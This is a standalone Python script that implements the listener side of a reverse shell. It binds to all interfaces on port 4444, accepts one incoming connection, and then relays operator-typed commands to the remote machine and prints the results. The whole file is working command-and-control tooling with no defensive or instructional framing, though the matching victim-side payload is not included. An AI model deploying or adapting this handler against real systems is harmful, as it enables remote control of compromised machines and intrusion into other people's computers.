import socket
import sys

def start_listener(host='0.0.0.0', port=4444):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(1)
        
        print(f"[*] Listening on {host}:{port}")
        print(f"[*] Waiting for connection...\n")
        client, addr = server.accept()
        print(f"[+] Connection established from {addr[0]}:{addr[1]}")
        banner = client.recv(1024).decode()
        print(banner)
        while True:
            try:
                prompt = client.recv(1024).decode()
                if not prompt:
                    break
                command = input()
                if command.lower() in ['exit', 'quit']:
                    client.send(b"exit")
                    print("[*] Closing connection...")
                    break
                client.send(command.encode())
                result = client.recv(4096).decode()
                print(result, end='')
            except KeyboardInterrupt:
                print("\n[*] Interrupted by user")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                break
        client.close()
        server.close()
        print("[*] Listener stopped")
    except Exception as e:
        print(f"[-] Error starting listener: {e}")
        sys.exit(1)

if __name__ == "__main__":
    port = 4444
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except:
            print("[-] Invalid port number")
            sys.exit(1)
    start_listener(port=port)
